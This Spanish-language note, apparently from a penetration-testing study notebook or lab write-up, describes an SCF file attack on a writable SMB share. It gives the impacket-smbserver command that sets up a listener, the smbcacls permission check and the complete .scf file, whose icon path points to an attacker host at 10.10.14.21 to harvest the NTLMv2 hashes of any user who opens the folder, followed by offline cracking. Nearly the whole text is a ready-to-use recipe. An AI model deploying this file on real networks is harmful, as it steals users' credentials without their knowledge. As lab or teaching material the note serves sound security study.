**SCF Malicious File Attack**

> 🚨 **Es necesario tener capacidad de escritura en un recurso compartido remoto para llevar a cabo el ataque.** 🚨

Cuando tenemos un recurso compartido montado y contamos con permisos de escritura en una carpeta (verificado previamente con la herramienta `smbcacls`), podemos crear un archivo malicioso con extensión `.scf`. Este archivo, sin interacción del usuario, nos permitirá obtener el hash NTLMv2 de la cuenta que interactúe con él al simplemente acceder al directorio donde se encuentra el archivo. 

Los pasos para llevar a cabo el ataque son los siguientes:

1. **Compartir un recurso utilizando impacket-smbserver:**

   Utilizamos la herramienta **impacket-smbserver** para compartir un recurso a nivel de la red con el nombre `smbFolder`:
   ```
   impacket-smbserver smbFolder $(pwd) -smb2support
   ```

2. **Verificar permisos de escritura en la carpeta:**

   Comprobamos si tenemos permisos de escritura en el recurso con `smbcacls`. Si tenemos acceso, podemos proceder a la siguiente etapa.
   ```
   smbcacls "//10.10.10.103/Department Shares" Users/Public | grep "Everyone"
   ```

3. **Crear el archivo malicioso .scf:**

   Creamos el archivo `.scf` en la ubicación donde tenemos acceso de escritura. El archivo tendrá la siguiente estructura:
   ```
   [Shell]
   Command=2
   IconFile=\\10.10.14.21\smbFolder\pentestlab.ico
   [Taskbar]
   Command=ToggleDesktop
   ```

4. **Resultados:**

   Una vez guardado el archivo, al ser cargado por el usuario, se disparará el ataque. Esto nos permitirá obtener el hash NTLMv2 del usuario de forma remota sin necesidad de interacción directa. Este hash puede ser luego crackeado por fuerza bruta de forma offline.
